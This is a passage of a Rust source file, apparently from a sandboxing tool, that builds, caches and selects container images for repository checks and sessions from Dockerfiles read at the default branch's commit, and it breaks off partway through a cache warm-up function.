//! The image a repository's checks and preparation run in, built by the node
//! from the repository's own Dockerfile.
//!
//! The recipe is read from the repository's default branch through Git's
//! object store, never from a working tree: a candidate that could edit the
//! Dockerfile its own checks run in could make any check pass. What a recipe
//! produced is this node's state (`repo_image`), because a locally built image
//! has a different digest on every node; `[[repo]]` carries only the recipe.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::Duration;

use sha2::{Digest, Sha256};
use tokio::sync::Mutex as AsyncMutex;

use crate::boundary::{Backend, BuildFailure, BuiltImage, ImageBuild, ImageBuilder, Presence};
use crate::config::{Config, Repo};
use crate::runner::{Runner, RunnerCommand};
use crate::store::{RepoImageStart, Store};

/// The image checks and preparation run in.
pub const BASE: &str = "base";

/// An image built for `repo_setup_try` from a drafted entry's Dockerfile.
/// Never what a repository's checks or sessions run in: an entry with the
/// same recipe adopts it as its `BASE` instead of building it again.
pub const TRIAL: &str = "trial";

/// Bumped when `normalised` changes what it adds, so every repository's image
/// is rebuilt with the new layer.
const NORMALISER: &str = "1";

const RECIPE_LABEL: &str = "io.tracon.recipe";

/// Long enough for a cold build of a full dev environment, short enough that a
/// build waiting on a prompt it will never get does not hold a session's start
/// for ever.
pub(crate) const BUILD_TIMEOUT: Duration = Duration::from_secs(45 * 60);

/// What a repository's image is built from, at one commit of its default
/// branch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Recipe {
    pub dockerfile: String,
    /// The context directory inside the repository; empty for its root.
    pub context: String,
    pub source_ref: String,
    pub source_commit: String,
    /// The context directory as a Git tree: what the build is given.
    pub context_tree: String,
    /// The Dockerfile, its context and the node's own layer, as one hash. A
    /// commit that touches none of them leaves it — and the image — as it was.
    pub hash: String,
    /// `[[repo]] build`: root steps on the stock base, built in place of a
    /// Dockerfile (`dockerfile` and `context` are then empty).
    pub steps: Vec<String>,
    /// The pinned stock base `steps` are built on.
    pub steps_base: String,
    /// The hosts `steps` reach, the entry's `egress` expanded.
    pub steps_egress: Vec<String>,
}

/// What `ensure_base` found or made.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Ensured {
    /// The repository's entry names no Dockerfile: nothing here to build.
    Unconfigured,
    /// The image for the current recipe was already built.
    Current(String),
    Rebuilt(String),
    /// The current recipe could not be built; an earlier image still stands.
    Stale {
        using: String,
        error: String,
    },
    /// There is no image for this repository at all.
    Unavailable {
        reason: String,
    },
}

impl Ensured {
    pub fn image(&self) -> Option<&str> {
        match self {
            Ensured::Current(image) | Ensured::Rebuilt(image) => Some(image),
            Ensured::Stale { using, .. } => Some(using),
            Ensured::Unconfigured | Ensured::Unavailable { .. } => None,
        }
    }
}

/// Why `repo`'s image was last not built, when no build row says so: the
/// builder was unavailable or cooling down, the entry was refused or held,
/// or a build the builder failed was dropped rather than recorded. Without
/// it, a `tracon repo build` that built nothing has nothing to read back.
/// Kept in memory: what a restart forgets, the next attempt says again.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct Unbuilt {
    pub repo_path: String,
    pub reason: String,
    /// The earlier image runs still use, if one stands.
    pub using: Option<String>,
    pub at_ms: i64,
}

#[derive(Default)]
struct Attempts {
    /// The last attempt for each repository that built nothing a row shows.
    unbuilt: HashMap<PathBuf, Unbuilt>,
    /// How many `ensure_base` calls are under way for each repository,
    /// waiting for the build lock included.
    ensuring: HashMap<PathBuf, usize>,
}

fn attempts() -> &'static StdMutex<Attempts> {
    static ATTEMPTS: std::sync::LazyLock<StdMutex<Attempts>> =
        std::sync::LazyLock::new(Default::default);
    &ATTEMPTS
}

/// Every repository whose last attempt built nothing a row shows, and why.
pub fn unbuilt() -> Vec<Unbuilt> {
    let mut notes: Vec<Unbuilt> = attempts()
        .lock()
        .unwrap()
        .unbuilt
        .values()
        .cloned()
        .collect();
    notes.sort_by(|a, b| a.repo_path.cmp(&b.repo_path));
    notes
}

/// The repositories an `ensure_base` is under way for: one asked for now
/// may be waiting behind another build before its own row appears.
pub fn ensuring() -> Vec<String> {
    let mut paths: Vec<String> = attempts()
        .lock()
        .unwrap()
        .ensuring
        .keys()
        .map(|path| path.to_string_lossy().into_owned())
        .collect();
    paths.sort();
    paths
}

/// Counts an `ensure_base` under way for `repo` until dropped.
struct Ensuring(PathBuf);

impl Ensuring {
    fn start(repo: &Path) -> Self {
        *attempts()
            .lock()
            .unwrap()
            .ensuring
            .entry(repo.to_path_buf())
            .or_default() += 1;
        Ensuring(repo.to_path_buf())
    }
}

impl Drop for Ensuring {
    fn drop(&mut self) {
        let mut attempts = attempts().lock().unwrap();
        if let Some(count) = attempts.ensuring.get_mut(&self.0) {
            *count -= 1;
            if *count == 0 {
                attempts.ensuring.remove(&self.0);
            }
        }
    }
}

/// Say what an `ensure_base` that began at `begun_ms` came to. One that
/// leaves `repo` without its current image is logged, and noted for `repo
/// ls` and Settings unless a failed build row already says it.
fn settle_outcome(store: &Store, repo: &Path, begun_ms: i64, ensured: &Ensured) {
    let (reason, using) = match ensured {
        Ensured::Stale { using, error } => (error, Some(using.clone())),
        Ensured::Unavailable { reason } => (reason, None),
        Ensured::Unconfigured | Ensured::Current(_) | Ensured::Rebuilt(_) => {
            attempts().lock().unwrap().unbuilt.remove(repo);
            return;
        }
    };
    let latest = store
        .latest_repo_image(&repo.to_string_lossy(), BASE)
        .ok()
        .flatten()
        .filter(|row| {
            row.status == "failed" && !row.error.is_empty() && reason.contains(&row.error)
        });
    if let Some(row) = latest {
        // A recorded failure shows itself; one that finished during this
        // call was logged as it failed.
        attempts().lock().unwrap().unbuilt.remove(repo);
        if row.finished_ms.unwrap_or(0) < begun_ms {
            tracing::warn!(repo = %repo.display(), %reason, "repository image not built");
        }
        return;
    }
    match &using {
        Some(image) => {
            tracing::warn!(repo = %repo.display(), %reason, using = %image, "repository image not built; the earlier image stands")
        }
        None => tracing::warn!(repo = %repo.display(), %reason, "repository image not built"),
    }
    attempts().lock().unwrap().unbuilt.insert(
        repo.to_path_buf(),
        Unbuilt {
            repo_path: repo.to_string_lossy().into_owned(),
            reason: reason.clone(),
            using,
            at_ms: crate::store::now_ms(),
        },
    );
}

/// One build at a time per repository: two sessions starting together wait
/// for one image rather than building it twice.
fn build_lock(repo: &Path) -> Arc<AsyncMutex<()>> {
    static LOCKS: std::sync::LazyLock<StdMutex<HashMap<PathBuf, Arc<AsyncMutex<()>>>>> =
        std::sync::LazyLock::new(|| StdMutex::new(HashMap::new()));
    LOCKS
        .lock()
        .unwrap()
        .entry(repo.to_path_buf())
        .or_default()
        .clone()
}

/// The last build each repository's lock saw finish: a count of the builds
/// finished so far, the recipe it built, and what came of it. A request that
/// waited on the lock while a build of its own recipe ran takes that build's
/// outcome rather than building the same recipe a second time.
type Finished = HashMap<PathBuf, (u64, String, Ensured)>;

fn finished() -> &'static StdMutex<Finished> {
    static FINISHED: std::sync::LazyLock<StdMutex<Finished>> =
        std::sync::LazyLock::new(Default::default);
    &FINISHED
}

/// How many builds of `repo` have finished, for telling later which one
/// finished while a request waited.
fn finished_count(repo: &Path) -> u64 {
    finished()
        .lock()
        .unwrap()
        .get(repo)
        .map_or(0, |(count, _, _)| *count)
}

fn record_finished(repo: &Path, recipe_hash: &str, ensured: &Ensured) {
    let mut finished = finished().lock().unwrap();
    let count = finished.get(repo).map_or(0, |(count, _, _)| *count) + 1;
    finished.insert(
        repo.to_path_buf(),
        (count, recipe_hash.to_string(), ensured.clone()),
    );
}

/// The outcome of a build of `recipe_hash` that finished after `seen`, as a
/// request that waited for it takes it. Its image is `Current` to that
/// request: the build that made it is the one that warms its cache.
fn joined(repo: &Path, recipe_hash: &str, seen: u64) -> Option<Ensured> {
    let finished = finished().lock().unwrap();
    let (count, hash, ensured) = finished.get(repo)?;
    if *count == seen || hash != recipe_hash {
        return None;
    }
    Some(match ensured.clone() {
        Ensured::Rebuilt(image) => Ensured::Current(image),
        other => other,
    })
}

/// One base-cache warm-up at a time per repository.
fn warm_lock(repo: &Path) -> Arc<AsyncMutex<()>> {
    static LOCKS: std::sync::LazyLock<StdMutex<HashMap<PathBuf, Arc<AsyncMutex<()>>>>> =
        std::sync::LazyLock::new(|| StdMutex::new(HashMap::new()));
    LOCKS
        .lock()
        .unwrap()
        .entry(repo.to_path_buf())
        .or_default()
        .clone()
}

/// When the build of `recipe_hash` now running for `repo` started, if one
/// is, its warm-up included: a forced build asked for meanwhile joins it
/// rather than starting another, and whoever asked follows that one.
pub fn in_flight(store: &Store, repo: &Path, recipe_hash: &str) -> Option<i64> {
    if build_lock(repo).try_lock().is_ok() {
        return None;
    }
    let settling = settling().lock().unwrap().get(repo).map(String::as_str) == Some(recipe_hash);
    store
        .latest_repo_image(&repo.to_string_lossy(), BASE)
        .ok()
        .flatten()
        .filter(|row| row.recipe_hash == recipe_hash)
        .filter(|row| row.status == "building" || (settling && row.status == "ready"))
        .map(|row| row.started_ms)
}

/// The recipe each repository's just-built image is being warmed for, under
/// the build lock.
fn settling() -> &'static StdMutex<HashMap<PathBuf, String>> {
    static SETTLING: std::sync::LazyLock<StdMutex<HashMap<PathBuf, String>>> =
        std::sync::LazyLock::new(Default::default);
    &SETTLING
}

/// Marks `repo`'s build as warming until dropped, however the warm-up ends.
struct Settling<'a>(&'a Path);

impl<'a> Settling<'a> {
    fn start(repo: &'a Path, recipe_hash: &str) -> Self {
        settling()
            .lock()
            .unwrap()
            .insert(repo.to_path_buf(), recipe_hash.to_string());
        Self(repo)
    }
}

impl Drop for Settling<'_> {
    fn drop(&mut self) {
        settling().lock().unwrap().remove(self.0);
    }
}

/// How long a builder that could not build is left alone for one recipe.
/// Every check run and preparation queued behind an outage would otherwise
/// each stage a tree and run the builder's check again, minutes of work to
/// learn the same thing.
const COOLDOWN: Duration = Duration::from_secs(120);

type Cooldowns = HashMap<(PathBuf, String), (std::time::Instant, String)>;

/// Builder outages still cooling down, by repository and recipe: until when,
/// and what the builder said.
fn cooldowns() -> &'static StdMutex<Cooldowns> {
    static COOLDOWNS: std::sync::LazyLock<StdMutex<Cooldowns>> =
        std::sync::LazyLock::new(Default::default);
    &COOLDOWNS
}

fn retry_note(error: &str, until: std::time::Instant) -> String {
    let left = until
        .saturating_duration_since(std::time::Instant::now())
        .as_secs()
        .max(1);
    format!("{error}; tried again in {left}s, or at once by `tracon repo build`")
}

/// What a builder outage left for this recipe, while it cools down.
fn cooling(repo: &Path, key: &str) -> Option<String> {
    let mut cooldowns = cooldowns().lock().unwrap();
    let at = (repo.to_path_buf(), key.to_string());
    match cooldowns.get(&at) {
        Some((until, error)) if *until > std::time::Instant::now() => {
            Some(retry_note(error, *until))
        }
        Some(_) => {
            cooldowns.remove(&at);
            None
        }
        None => None,
    }
}

/// Leave this recipe alone for a while after the builder could not build
/// it; the error, saying when it is tried again.
fn cool(repo: &Path, key: &str, error: &str) -> String {
    let until = std::time::Instant::now() + COOLDOWN;
    cooldowns().lock().unwrap().insert(
        (repo.to_path_buf(), key.to_string()),
        (until, error.to_string()),
    );
    retry_note(error, until)
}

fn warm(repo: &Path, key: &str) {
    cooldowns()
        .lock()
        .unwrap()
        .remove(&(repo.to_path_buf(), key.to_string()));
}

/// The `[[repo]]` entry for `repo`, if it names a Dockerfile or build steps
/// to build.
pub fn building_entry(cfg: &Config, repo: &Path) -> Option<Repo> {
    cfg.repos()
        .iter()
        .find(|entry| entry.matches(repo))
        .filter(|entry| entry.dockerfile.is_some() || !entry.build.is_empty())
        .cloned()
}

/// The recipe `entry` names, as the repository's default branch has it now.
pub async fn recipe(repo: &Path, entry: &Repo, run_as: &RunAs) -> Result<Recipe, String> {
    if !entry.build.is_empty() {
        let base = crate::sandbox_images::active_base().ok_or(STEPS_UNPINNED)?;
        return steps_recipe(repo, entry, &base).await;
    }
    let dockerfile = entry
        .dockerfile
        .clone()
        .ok_or("the repository's entry names no dockerfile")?;
    let context = match entry.context.as_deref() {
        Some(".") => String::new(),
        Some(context) => context.to_string(),
        None => dockerfile
            .rsplit_once('/')
            .map(|(directory, _)| directory.to_string())
            .unwrap_or_default(),
    };
    let dir = repo.to_string_lossy();
    let (source_ref, source_commit) = default_commit(repo).await?;
    let found = |what: &str, path: &str| {
        format!(
            "{what} {path} is not in {source_ref} ({})",
            &source_commit[..source_commit.len().min(12)]
        )
    };
    let blob = crate::review::resolve(&dir, &format!("{source_commit}:{dockerfile}"))
        .await
        .map_err(|_| found("the Dockerfile", &dockerfile))?;
    // `<commit>:<path>` takes everything after the colon as the path, so the
    // root, which has no path, is asked for by peeling the commit instead.
    let tree = match context.is_empty() {
        true => format!("{source_commit}^{{tree}}"),
        false => format!("{source_commit}:{context}"),
    };
    let context_tree = crate::review::resolve(&dir, &tree)
        .await
        .map_err(|_| found("the build context", &context))?;
    let mut hash = Sha256::new();
    for part in [NORMALISER, &dockerfile, &blob, &context, &context_tree] {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    hash.update(run_as.key().as_bytes());
    hash.update([0]);
    // A recipe may stand on the stock base (`FROM ${TRACON_SANDBOX_BASE}`),
    // so a new base is a new recipe.
    if let Some(base) = crate::sandbox_images::active_base() {
        hash.update(crate::sandbox_images::BASE_ARG.as_bytes());
        hash.update([0]);
        hash.update(base.as_bytes());
        hash.update([0]);
    }
    Ok(Recipe {
        dockerfile,
        context,
        source_ref,
        source_commit,
        context_tree,
        hash: hex::encode(hash.finalize()),
        steps: Vec::new(),
        steps_base: String::new(),
        steps_egress: Vec::new(),
    })
}

/// The commit the recipe is read at. A clone the node manages always has
/// `origin/HEAD`; an operator's own checkout made with `git init` may not, and
/// what it has committed is then the only default there is. Never the working
/// tree, in either case.
pub(crate) async fn default_commit(repo: &Path) -> Result<(String, String), String> {
    let dir = repo.to_string_lossy();
    if let Ok(commit) = crate::review::resolve(&dir, "refs/remotes/origin/HEAD^{commit}").await {
        let name = match crate::review::default_base(&dir).await {
            Ok(branch) => format!("origin/{branch}"),
            Err(_) => "origin/HEAD".into(),
        };
        return Ok((name, commit));
    }
    if repo.starts_with(crate::forge::managed_root(&Config::state_dir())) {
        return Err("the clone has no origin/HEAD to read the Dockerfile from".into());
    }
    crate::review::resolve(&dir, "HEAD^{commit}")
        .await
        .map(|commit| ("HEAD".to_string(), commit))
        .map_err(|_| {
            format!(
                "{} has no commit to read the Dockerfile from",
                repo.display()
            )
        })
}

/// `localhost/tracon-repo-<name>-<hash>`: readable in `podman images`, and
/// distinct for two repositories that share a directory name. A node with a
/// `[boundary] resource_prefix` of its own names them `<prefix>-repo-…`, so
/// a second node on one store never moves the first's tags; the default
/// prefix keeps the name every image was built under. Each build is tagged
/// under it with a tag of its own ([`build_tag`]).
pub(crate) fn image_name(repo: &Path) -> String {
    let slug: String = repo
        .file_name()
        .map(|name| name.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    let slug = slug.trim_matches('-');
    let hash = hex::encode(Sha256::digest(repo.as_os_str().as_encoded_bytes()));
    let stem = image_stem();
    match slug.is_empty() {
        true => format!("{stem}{}", &hash[..10]),
        false => format!("{stem}{slug}-{}", &hash[..10]),
    }
}

/// What every repository image of this node's is named under:
/// `localhost/<prefix>-repo-`.
pub(crate) fn image_stem() -> String {
    format!("localhost/{}", crate::config::resource_name("repo-"))
}

/// The tag one build is made under: `<name>:<key>-<build>`, the first
/// characters of its recipe (or layer key) and the store row that records
/// it. No other build shares it, so nothing another process builds (a
/// second node on the same image store, a test on the same checkout path)
/// can move it between the build and the digest read back from it, or take
/// the last name the recorded `name@sha256:…` resolves by off the image
/// while something still runs from it: Podman resolves a digest reference
/// only through a tag of the same name.
pub(crate) fn build_tag(name: &str, key: &str, build: &str) -> String {
    let build: String = build.chars().filter(char::is_ascii_alphanumeric).collect();
    format!("{name}:{}-{build}", &key[..key.len().min(12)])
}

/// A build's labels: its recipe, and this node as its owner
/// (`crate::image_gc`).
fn build_labels(recipe_hash: &str) -> Vec<(String, String)> {
    crate::image_gc::with_owner(&[(RECIPE_LABEL.to_string(), recipe_hash.to_string())])
}

/// Who a run in a repository's image is, which decides what the node's layer
/// over it does: this uid and group, never root, with this home. Part of
/// every key built from it, so an image made for one profile is never taken
/// for another's.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RunAs {
    pub uid: i64,
    pub home: String,
}

impl RunAs {
    /// The profile every runtime runs repository images with: the stock
    /// base's own user, which every sandbox runs as.
    pub fn sandbox() -> Self {
        RunAs {
            uid: 65532,
            home: crate::sandbox_images::HOME.into(),
        }
    }

    /// What a key adds for this profile.
    fn key(&self) -> String {
        format!("pod:{}:{}", self.uid, self.home)
    }
}

/// The node's layer over a repository's own image, so every run in it meets
/// the same thing whatever the Dockerfile ended on.
///
/// An `ENTRYPOINT` (a devcontainer's process supervisor) would swallow the
/// command a run names, and a login shell on some bases resets `PATH`,
/// losing what the Dockerfile's `ENV PATH` added; the profile line puts it
/// back.
///
/// A run is never root: it runs as the profile's uid, which owns `/work`,
/// `/cache` and the harness's home here, and the image says so with its last
/// `USER`. The uid is given a name where the image has none for it, because
/// Git, SSH and some package managers refuse to run as a uid with no passwd
/// entry. What the repository installed has to be readable and executable
/// by that uid, which nothing here can arrange after the fact (see
/// ARCHITECTURE, "the recipe is configuration").
fn normalised(source: &str, run_as: &RunAs) -> String {
    let RunAs { uid, home } = run_as;
    format!(
        "FROM {source}\n\
         USER 0:0\n\
         RUN mkdir -p /work /cache {home} && chown {uid}:{uid} /work /cache \
         && chown -R {uid}:{uid} {home} \
         && if ! grep -q '^[^:]*:[^:]*:{uid}:' /etc/passwd 2>/dev/null; then \
         echo 'harness:x:{uid}:{uid}::{home}:/bin/sh' >> /etc/passwd; fi \
         && if ! grep -q '^[^:]*:[^:]*:{uid}:' /etc/group 2>/dev/null; then \
         echo 'harness:x:{uid}:' >> /etc/group; fi \
         && if [ -d /etc/profile.d ]; then \
         printf 'export PATH=\"%s\"\\n' \"$PATH\" > /etc/profile.d/zz-tracon-path.sh; fi\n\
         ENV HOME={home}\n\
         WORKDIR /work\n\
         USER {uid}:{uid}\n\
         ENTRYPOINT []\n"
    )
}

/// Why `entry` is refused, if it is: it names an `image`, or a Dockerfile
/// (whose text is `dockerfile`, where it could be read) that does not begin
/// on the stock base. Every sandbox runs as the base's own user, in the
/// `/work`, `/cache` and home the base made that user's; an image of the
/// repository's own has none of them, and no layer over an arbitrary image
/// can be trusted to add them.
pub fn off_the_stock_base(entry: &Repo, dockerfile: Option<&str>) -> Option<String> {
    let path = entry.path.display();
    let migrate = "this node's sandboxes run every repository on the stock base; install what \
        it needs with root `build` steps in its [[repo]] entry, and fetch its dependencies with \
        `prepare`";
    if let Some(image) = &entry.image {
        return Some(format!(
            "[[repo]] {path}: `image = {image:?}` is refused: {migrate}"
        ));
    }
    let named = entry.dockerfile.as_deref()?;
    let from = first_from(dockerfile?)?;
    let base = crate::sandbox_images::BASE_ARG;
    if from == format!("${{{base}}}") || from == format!("${base}") {
        return None;
    }
    Some(format!(
        "[[repo]] {path}: `dockerfile = {named:?}` begins `FROM {from}`, not \
         `FROM ${{{base}}}`, and is refused: {migrate} (or begin the Dockerfile \
         `FROM ${{{base}}}`)"
    ))
}

/// [`off_the_stock_base`] for `repo`, reading its Dockerfile from the default
/// branch as a build would. One that cannot be read is left to the build to
/// report.
pub async fn refusal(repo: &Path, entry: &Repo) -> Option<String> {
    let dockerfile = match &entry.dockerfile {
        Some(path) if entry.image.is_none() => {
            let (_, commit) = default_commit(repo).await.ok()?;
            let object = format!("{commit}:{path}");
            let blob = crate::review::blob(&repo.to_string_lossy(), &object)
                .await
                .ok()?;
            Some(String::from_utf8_lossy(&blob).into_owned())
        }
        _ => None,
    };
    off_the_stock_base(entry, dockerfile.as_deref())
}

/// What a Dockerfile's first `FROM` stands on, its flags and stage name
/// aside.
fn first_from(dockerfile: &str) -> Option<String> {
    let mut instruction = String::new();
    for line in dockerfile.lines() {
        let line = line.trim();
        // Comments are dropped inside a continued instruction too.
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(continued) = line.strip_suffix('\\') {
            instruction.push_str(continued);
            instruction.push(' ');
            continue;
        }
        instruction.push_str(line);
        let mut words = instruction.split_whitespace();
        if words
            .next()
            .is_some_and(|word| word.eq_ignore_ascii_case("FROM"))
        {
            return words
                .find(|word| !word.starts_with("--"))
                .map(str::to_string);
        }
        instruction.clear();
    }
    None
}

/// The image one session's harness runs in. Kept with a sandbox the node
/// leaves running (`runner::reattach`), so the session carried on in it says
/// what it runs in rather than what would be chosen now.
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(default)]
pub struct SessionImage {
    /// `None` is the stock base.
    pub image: Option<String>,
    /// The repository image under it: what its checks run in.
    pub toolchain_image: Option<String>,
    /// Why a session whose repository has an image is not running in it.
    pub note: Option<String>,
}

/// `image_source` for a session from the bundle on the release's own base.
pub const STOCK_BASE: &str = "stock base";

/// `image_source` for a session on another provider in the image the
/// operator gave it (`[digitalocean] image`).
pub const OPERATOR_IMAGE: &str = "operator image";

/// The `image_source` of a session placed on another provider, which
/// started from `started_in`'s template there. Its [`SessionImage`] holds
/// nothing of this node's runtime, so it cannot say.
pub fn source_elsewhere(started_in: &str, base: &str) -> &'static str {
    if crate::sandbox_images::is_snapshot(started_in) {
        crate::sandbox_images::SNAPSHOT_SOURCE
    } else if started_in == base {
        STOCK_BASE
    } else {
        OPERATOR_IMAGE
    }
}

impl SessionImage {
    /// The one `image_source` a session reports. With the harness from the
    /// bundle there is no harness image: a session with no image of its own
    /// runs on the stock base, and one in an image other than its toolchain
    /// runs from the snapshot prepared in that toolchain.
    pub fn source(&self, cfg: &Config) -> &'static str {
        match (&self.image, &self.toolchain_image) {
            (None, _) => STOCK_BASE,
            (Some(image), Some(toolchain)) if image != toolchain => {
                crate::sandbox_images::SNAPSHOT_SOURCE
            }
            (Some(image), _) if *image == crate::sandbox_images::base_image(cfg) => STOCK_BASE,
            (Some(_), _) => "repository image",
        }
    }

    pub fn from_snapshot(&self, cfg: &Config) -> bool {
        self.source(cfg) == crate::sandbox_images::SNAPSHOT_SOURCE
    }

    /// The image a session reports it runs in: the stock base, where a
    /// session from the bundle has none of its own.
    pub fn reported(&self, cfg: &Config) -> String {
        self.image
            .clone()
            .unwrap_or_else(|| crate::sandbox_images::base_image(cfg))
    }

    fn aside(note: impl Into<String>) -> Self {
        Self {
            note: Some(note.into()),
            ..Default::default()
        }
    }
}

/// The image a session on `repo` runs in. Nothing is layered over it: the
/// harness comes from the bundle. The repository's prepared snapshot where
/// its entry prepares anything (made now, once, if there is none for what
/// the default branch needs), else its own image, else the stock base.
///
/// A repository with no image yet builds one here, and `building` is called
/// first because that takes minutes. One whose Dockerfile has since moved
/// starts on the image it has and is rebuilt behind the session, so a
/// Dockerfile change costs the next session nothing and this one no wait.
/// Anything that stops the session having its repository's image leaves it
/// on the stock base, with the reason: a session that cannot build is still
/// the one that can fix what broke. `Err` is a repository this node refuses
/// ([`refusal`]), whose session does not start.
pub async fn session_image(
    backend: &Arc<dyn Backend>,
    cfg: &Arc<Config>,
    store: &Arc<Store>,
    repo: &Path,
    building: &(dyn Fn() + Send + Sync),
) -> Result<SessionImage, String> {
    let repos = cfg.repos();
    let Some(entry) = repos.iter().find(|entry| entry.matches(repo)) else {
        return Ok(SessionImage::default());
    };
    if let Some(refused) = refusal(repo, entry).await {
        return Err(refused);
    }
    let toolchain = match (&entry.image, &entry.dockerfile, backend.image_builder()) {
        (None, None, _) if entry.build.is_empty() => crate::environment::harness_image(cfg),
        (_, _, Some(builder)) => {
            match repository_base(backend, cfg, store, repo, entry, builder, building).await {
                Ok(base) => base,
                Err(aside) => return Ok(aside),
            }
        }
        (_, _, None) => {
            return Ok(SessionImage::aside(format!(
                "the {} runtime cannot build images",
                backend.kind()
            )))
        }
    };
    let environment = crate::environment::environment_for(cfg, store, Some(repo));
    let snapshot = match environment.image == toolchain {
        true => {
            crate::sandbox_images::snapshot_for(
                backend.as_ref(),
                cfg,
                store,
                repo,
                &environment,
                true,
            )
            .await
        }
        // A standing image is what this session runs; the one its checks
        // will run is still being built.
        false => None,
    };
    Ok(SessionImage {
        image: Some(snapshot.unwrap_or_else(|| toolchain.clone())),
        toolchain_image: Some(toolchain),
        note: None,
    })
}

/// The repository's own image a session on `repo` stands on: the one its
/// entry names, or the one built from its Dockerfile (built here if there is
/// none yet, rebuilt behind the session if its recipe moved). `Err` is what
/// the session is told instead.
async fn repository_base(
    backend: &Arc<dyn Backend>,
    cfg: &Arc<Config>,
    store: &Arc<Store>,
    repo: &Path,
    entry: &Repo,
    builder: &dyn ImageBuilder,
    building: &(dyn Fn() + Send + Sync),
) -> Result<String, SessionImage> {
    Ok(match &entry.image {
        Some(image) => image.clone(),
        None => {
            let repo_path = repo.to_string_lossy();
            // A registry that cannot be asked keeps what is standing.
            let standing = match store.ready_repo_image(&repo_path, BASE).ok().flatten() {
                Some(row) if builder.presence(&row.image).await != Presence::Absent => Some(row),
                _ => None,
            };
            match standing {
                Some(row) => {
                    let moved = recipe(repo, entry, &RunAs::sandbox())
                        .await
                        .is_ok_and(|recipe| recipe.hash != row.recipe_hash);
                    if moved {
                        let (backend, cfg, store) = (backend.clone(), cfg.clone(), store.clone());
                        let repo = repo.to_path_buf();
                        tokio::spawn(async move {
                            ensure_base(backend.as_ref(), &cfg, &store, &repo, false).await;
                        });
                    }
                    row.image
                }
                None => {
                    building();
                    match ensure_base(backend.as_ref(), cfg, store, repo, false).await {
                        Ensured::Unavailable { reason } => return Err(SessionImage::aside(reason)),
                        ensured => match ensured.image() {
                            Some(image) => image.to_string(),
                            None => return Err(SessionImage::default()),
                        },
                    }
                }
            }
        }
    })
}

/// What a build is counted as in `tracon_image_builds_total`.
fn count_build(
    image: &str,
    repo: &Path,
    failure: Option<&BuildFailure>,
    begun: std::time::Instant,
) {
    let outcome = match failure {
        None => "built",
        Some(failure) if failure.transient => "transient",
        Some(_) => "failed",
    };
    crate::telemetry::telemetry().image_built(
        image,
        repo.file_name()
            .map(|name| name.to_string_lossy())
            .as_deref(),
        outcome,
        begun.elapsed(),
    );
}

/// Make sure the image for `repo`'s current recipe exists, building it if it
/// does not. `force` rebuilds even an image that is current, and retries a
/// recipe that already failed.
///
/// A recipe that fails is not retried on its own: every session start and
/// every check would otherwise repeat a build that takes minutes to fail the
/// same way. The last image that built keeps the repository usable meanwhile.
pub async fn ensure_base(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    force: bool,
) -> Ensured {
    let _ensuring = Ensuring::start(repo);
    let begun_ms = crate::store::now_ms();
    let ensured = resolve_base(backend, cfg, store, repo, force).await;
    settle_outcome(store, repo, begun_ms, &ensured);
    ensured
}

async fn resolve_base(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    force: bool,
) -> Ensured {
    let Some(entry) = building_entry(cfg, repo) else {
        return Ensured::Unconfigured;
    };
    if let Some(reason) = refusal(repo, &entry).await {
        return Ensured::Unavailable { reason };
    }
    // An entry that keeps lending credentials to a preparation a peer's
    // recipe changed builds nothing, forced or not, until the operator
    // starts that build: a build is followed by the one warm-up the
    // credentials are lent to. What last built keeps the repository usable.
    if let Some(hold) = crate::mesh::recipe::held(store, &entry) {
        let reason = crate::mesh::recipe::held_reason(&hold);
        tracing::info!(repo = %repo.display(), "repository image held: {reason}");
        return match store
            .ready_repo_image(&repo.to_string_lossy(), BASE)
            .ok()
            .flatten()
        {
            Some(row) => Ensured::Stale {
                using: row.image,
                error: reason,
            },
            None => Ensured::Unavailable { reason },
        };
    }
    let Some(builder) = backend.image_builder() else {
        return Ensured::Unavailable {
            reason: format!("the {} runtime cannot build images", backend.kind()),
        };
    };
    let runner = backend.runner(Vec::new());
    let commands = crate::environment::environment_for(cfg, store, Some(repo));
    let commands: Vec<String> = commands
        .checks
        .into_iter()
        .chain(commands.prepare)
        .collect();
    ensure_with(
        builder,
        runner.as_ref(),
        cfg,
        store,
        repo,
        &entry,
        &commands,
        force,
        Some(backend),
    )
    .await
}

/// Prepare the repository's default branch in its image and snapshot the
/// result, which its runs start from (`sandbox_images::warm_after`). This is
/// the only thing that ever makes that snapshot: what is in it came from
/// source the operator already merged, through the entry's own `prepare` and
/// `egress`, so every candidate and every session can start from it without
/// inheriting anything another candidate installed. A warm-up that fails
/// leaves runs to prepare from colder.
///
/// It is also the one preparation lent the entry's `prepare_credentials`: it
/// runs source the operator merged, not a candidate's, and what it fetches
/// from a private registry is what the others then install from the cache
/// without the credential. A credential the broker will not lend stops the
/// warm-up before anything runs, rather than letting the registry refuse it.
/// Lent as environment, or with `[upstreams] preparation = "attach"` not lent
/// into the container at all: the node attaches each to the requests for its
/// declared host instead.
///
/// One warm-up at a time per repository: one asked for while another runs
/// waits, and makes nothing if that one already made the snapshot it would,
/// or failed to. Run again, without a rebuild, once the operator saves a
/// host a warm-up was refused.
pub(crate) async fn warm_base_cache(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: &Path,
) {
    let lock = warm_lock(repo);
    let seen = crate::sandbox_images::made_count(repo);
    let _warming = lock.lock().await;
    let environment = crate::environment::environment_for(cfg, store, Some(repo));
    if environment.prepare.is_empty() {
        return;
    }
    // A repository prepared on the stock base has a snapshot too, so any
    // entry with a `prepare` is warmed.
    let Some(entry) = cfg
        .repos()
        .iter()
        .find(|entry| entry.matches(repo))
        .cloned()
    else {
        return;
    };
    if let Some(refused) = refusal(repo, &entry).await {
        tracing::warn!(repo = %repo.display(), %refused, "base cache not warmed");
        return;
    }
    // `ensure_base` builds nothing for a held entry, so it never gets here;
    // this is the one place credentials are lent, so it checks again.
